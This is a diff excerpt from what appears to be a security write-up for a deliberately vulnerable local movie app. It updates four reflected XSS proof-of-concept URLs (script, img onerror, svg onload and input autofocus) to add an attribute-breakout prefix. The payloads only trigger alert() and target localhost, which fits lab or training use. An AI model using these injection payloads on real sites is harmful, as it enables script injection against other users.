@@ -133,16 +133,16 @@ curl -X POST http://localhost:5001/api/user/upload \
 **Exploitation**:
 ```bash
 # Basic script tag
-http://localhost:5173/movies?search=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
+http://localhost:5173/movies?search=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
 
 # Image with onerror
-http://localhost:5173/movies?search=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E
+http://localhost:5173/movies?search=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E
 
 # SVG with onload
-http://localhost:5173/movies?search=%3Csvg%20onload%3Dalert%281%29%3E
+http://localhost:5173/movies?search=%22%3E%3Csvg%20onload%3Dalert%281%29%3E
 
 # Input with autofocus
-http://localhost:5173/movies?search=%3Cinput%20onfocus%3Dalert%281%29%20autofocus%3E
+http://localhost:5173/movies?search=%22%3E%3Cinput%20onfocus%3Dalert%281%29%20autofocus%3E
 ```
 
 ### 3.2 Stored XSS in Reviews
